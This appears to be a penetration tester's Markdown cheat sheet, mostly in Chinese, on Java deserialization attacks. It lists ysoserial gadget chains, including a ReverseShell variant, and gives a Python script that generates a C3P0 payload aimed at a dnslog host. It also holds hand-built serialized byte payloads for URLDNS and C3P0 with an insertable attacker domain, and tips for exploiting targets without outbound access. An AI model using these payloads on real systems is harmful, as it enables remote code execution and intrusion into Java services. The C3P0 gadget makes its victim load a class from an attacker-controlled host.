- https://github.com/wh1t3p1g/ysomap
- https://github.com/zema1/ysoserial
- https://github.com/su18/ysoserial

通过dns探测class：
- https://github.com/kezibei/Urldns
各个gadget的说明：
- https://github.com/kezibei/Urldns/blob/main/src/main/en.java
参考代码：
- https://github.com/BishopFox/GadgetProbe/blob/ab1bc54e3fd66bd07b58a14293bfd7559ffe5ce6/src/main/java/com/bishopfox/gadgetprobe/GadgetProbe.java#L80

# ysoserial

new gadget:
Click1: https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Click1.java

AspectJWeaver: 
- https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/AspectJWeaver.java
- https://medium.com/nightst0rm/t%C3%B4i-%C4%91%C3%A3-chi%E1%BA%BFm-quy%E1%BB%81n-%C4%91i%E1%BB%81u-khi%E1%BB%83n-c%E1%BB%A7a-r%E1%BA%A5t-nhi%E1%BB%81u-trang-web-nh%C6%B0-th%E1%BA%BF-n%C3%A0o-61efdf4a03f5
- [[AntCTFxD^3CTF non-RCE题解]Servlet时间竞争以及AsjpectJWeaver反序列化Gadget构造](https://mp.weixin.qq.com/s/GxFFBekqSl5BOnzAKFGBDQ)
- [ysoserial AspectJWeaver file write gadget](https://xz.aliyun.com/t/9168)
- [关于FileUpload1](https://blog.spoock.com/2018/10/15/cve-2016-1000031/)

```
- FileUpload的1.3.1之前的版本配合JDK1.7之前的版本，能够达到写入任意文件的漏洞;
- FileUpload的1.3.1之前的版本配合JDK1.7及其之后的版本，能够向任意目录写入文件;
- FileUpload的1.3.1以及之后的版本只能向特定目录写入文件，此目录也必须存在。(文件的的命名也无法控制);
```

- 不依赖cc的cb链：https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html
## Usage

```shell
$ java -jar target/ysoserial-0.0.8-SNAPSHOT-all.jar
Y SO SERIAL?
Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
  Available payload types:
四月 16, 2021 4:48:47 下午 org.reflections.Reflections scan
信息: Reflections took 112 ms to scan 1 urls, producing 16 keys and 213 values
     Payload                        Authors                                Dependencies

     -------                        -------                                ------------

     BeanShell1                     @pwntester, @cschneider4711            bsh:2.0b5

     C3P0                           @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11

     Clojure                        @JackOfMostTrades                      clojure:1.8.0

     CommonsBeanutils1              @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2

     CommonsBeanutils1_Cl           @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2

     CommonsBeanutils1_Cl2          @shadowsock5-TomcatEcho-simple         commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2

     CommonsBeanutils1_Cl2_2        @shadowsock5-TomcatEcho-complex        commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2

     CommonsBeanutils1_Cl2_3        @shadowsock5-ReverseShell              commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2

     CommonsBeanutils1_Cl3          @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2

     CommonsBeanutils1_Cl4          @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2

     CommonsBeanutils1_Cl5          @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2

     CommonsBeanutils1_Cl6          @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2

     CommonsBeanutils1_Cl7          @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2

     CommonsBeanutils1_Cl8          @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2

     CommonsBeanutils1_Cl9          @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2

     CommonsCollections1            @frohoff                               commons-collections:<=3.2.1

     CommonsCollections10           @wh1t3p1g                              commons-collections:3.2.1

     CommonsCollections10TomcatEcho @Shadowsock5                           commons-collections:3.2.1

     CommonsCollections2            @frohoff                               commons-collections4:4.0

     CommonsCollections3            @frohoff                               commons-collections:<=3.2.1

     CommonsCollections4            @frohoff                               commons-collections4:4.0

     CommonsCollections5            @matthias_kaiser, @jasinner            commons-collections:<=3.2.1

     CommonsCollections6            @matthias_kaiser                       commons-collections:<=3.2.1

     CommonsCollections7            @scristalli, @hanyrax, @EdoardoVignati commons-collections:<=3.2.1

     CommonsCollectionsK1           @koalr                                 commons-collections:<=3.2.1

     CommonsCollectionsK1JettyEcho  @koalr                                 commons-collections:<=3.2.1

     CommonsCollectionsK1TomcatEcho @koalr                                 commons-collections:<=3.2.1

     CommonsCollectionsK2           @koalr                                 commons-collections4:4.0

     CommonsCollectionsK2TomcatEcho @koalr                                 commons-collections4:4.0

     CommonsCollectionsK3           @koalr                                 commons-collections:<=3.2.1

     CommonsCollectionsK4           @koalr                                 commons-collections4:4.0

     Groovy1                        @frohoff                               groovy:2.3.9

     Hibernate1                     @mbechler

     Hibernate2                     @mbechler

     JBossInterceptors1             @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     JRMPClient                     @mbechler

     JRMPClient2                    @mbechler

     JRMPClient3

     JRMPClient4

     JRMPListener                   @mbechler

     JSON1                          @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     JavassistWeld1                 @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     Jdk7u21                        @frohoff

     Jdk8u20                        @pwntester, @koalr

     LdapAttribute1

     MozillaRhino1                  @matthias_kaiser                       js:1.7R2

     MozillaRhino2                  @_tint0                                js:1.7R2

     Myfaces1                       @mbechler

     Myfaces2                       @mbechler

     ROME                           @mbechler                              rome:1.0

     Spring1                        @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE

     Spring2                        @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2

     URLDNS                         @gebl

     Vaadin1                        @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
```

## 回显
- CC链的回显修改createTemplatesImplEcho方法
- CB链的回显在ysoserial包下新增一个ClassLoader，在其static代码块中修改即可


## 生成hex字符串方法
```py
import subprocess

ysoserial_path = 'D:\\repos\\ysoserial\\target\\ysoserial-0.0.8-SNAPSHOT-all.jar'
popen = subprocess.Popen(['D:\\repos\\Java\\jdk1.7.0_80\\bin\\java.exe', '-jar', ysoserial_path, 'C3P0', 'http://7777777777.c3p0.dnslog.cn/:Exploit'], stdout=subprocess.PIPE)
print(popen.stdout.read())
```

## 常用gadget的二进制代码
用于dnslog的替换

### URLDNS

```py
import struct

# URLDNS http://7777777777.urldns.qq.dnslog.cn/test
urldns_url   = 'http://{0}.urldns.{1}/test'.format(self.BANNER, self.DOMAIN)
urldns_url_b = urldns_url.encode()
urldns_host  = '{0}.urldns.{1}'.format(self.BANNER, self.DOMAIN)
urldns_host_b= urldns_host.encode()

__bb_URLDNS = b"\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\x0cw\x08\x00\x00\x00\x10\x00\x00\x00\x01sr\x00\x0cjava.net.URL\x96%76\x1a\xfc\xe4r\x03\x00\x07I\x00\x08hashCodeI\x00\x04portL\x00\tauthorityt\x00\x12Ljava/lang/String;L\x00\x04fileq\x00~\x00\x03L\x00\x04hostq\x00~\x00\x03L\x00\x08protocolq\x00~\x00\x03L\x00\x03refq\x00~\x00\x03xp\xff\xff\xff\xff\xff\xff\xff\xfft" +  struct.pack('>H', len(urldns_host_b)) + urldns_host_b + b"t\x00\x05/testq\x00~\x00\x05t\x00\x04httppxt" + struct.pack('>H', len(urldns_url_b)) + urldns_url_b + b"x"

```

### C3P0
```py
import struct

# http://7777777777.c3p0.qq.dnslog.cn/:Exploit
c3p0_host =  'http://{0}.c3p0.{1}'.format(self.BANNER, self.DOMAIN)
c3p0_host_b= c3p0_host.encode()

__bb_C3P0 = b'\xac\xed\x00\x05sr\x00(com.mchange.v2.c3p0.PoolBackedDataSource\xde"\xcdl\xc7\xff\x7f\xa8\x02\x00\x00xr\x005com.mchange.v2.c3p0.impl.AbstractPoolBackedDataSource\x00\x00\x00\x00\x00\x00\x00\x01\x03\x00\x00xr\x001com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase\x00\x00\x00\x00\x00\x00\x00\x01\x03\x00\x08I\x00\x10numHelperThreadsL\x00\x18connectionPoolDataSourcet\x00$Ljavax/sql/ConnectionPoolDataSource;L\x00\x0edataSourceNamet\x00\x12Ljava/lang/String;L\x00\nextensionst\x00\x0fLjava/util/Map;L\x00\x14factoryClassLocationq\x00~\x00\x04L\x00\ridentityTokenq\x00~\x00\x04L\x00\x03pcst\x00"Ljava/beans/PropertyChangeSupport;L\x00\x03vcst\x00"Ljava/beans/VetoableChangeSupport;xpw\x02\x00\x01sr\x00=com.mchange.v2.naming.ReferenceIndirector$ReferenceSerializedb\x19\x85\xd0\xd1*\xc2\x13\x02\x00\x04L\x00\x0bcontextNamet\x00\x13Ljavax/naming/Name;L\x00\x03envt\x00\x15Ljava/util/Hashtable;L\x00\x04nameq\x00~\x00\nL\x00\treferencet\x00\x18Ljavax/naming/Reference;xppppsr\x00\x16javax.naming.Reference\xe8\xc6\x9e\xa2\xa8\xe9\x8d\t\x02\x00\x04L\x00\x05addrst\x00\x12Ljava/util/Vector;L\x00\x0cclassFactoryq\x00~\x00\x04L\x00\x14classFactoryLocationq\x00~\x00\x04L\x00\tclassNameq\x00~\x00\x04xpsr\x00\x10java.util.Vector\xd9\x97}[\x80;\xaf\x01\x03\x00\x03I\x00\x11capacityIncrementI\x00\x0celementCount[\x00\x0belementDatat\x00\x13[Ljava/lang/Object;xp\x00\x00\x00\x00\x00\x00\x00\x00ur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\nppppppppppxt\x00\x07Exploitt' + struct.pack('>H', len(c3p0_host_b)+1) + c3p0_host_b + b'/t\x00\x07exploitppppw\x04\x00\x00\x00\x00xw\x02\x00\x01x'    

```

C3P0不出网利用：
> 市面上存在两个C3P0，com.mchange:c3p0、c3p0:c3p0。比较常见的是第一个，两个C3P0都能够利用但是因为SUID的原因需要稍微变化一下，黑盒反序列打第一个没反应时可以尝试下第二个，可能有惊喜~

参考：
- http://redteam.today/2020/04/18/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget/
- https://mp.weixin.qq.com/s/KBog9XXz7Of93hAiV8Y7fQ
- https://wx.zsxq.com/mweb/views/topicdetail/topicdetail.html?topic_id=818885112215152&inviter_id=28512258815451&share_from=ShareToWechat&keyword=yRB6EQj
- [cc常见的链关系图](https://wx.zsxq.com/mweb/views/topicdetail/topicdetail.html?topic_id=218851818848141&inviter_id=28512258815451&share_from=ShareToWechat&keyword=UZ7mUj6)

## Ref
- [Real Wolrd CTF 3rd Writeup | Old System](https://mp.weixin.qq.com/s/ClASwg6SH0uij_-IX-GahQ)
- https://github.com/voidfyoo/rwctf-2021-old-system/tree/main/writeup
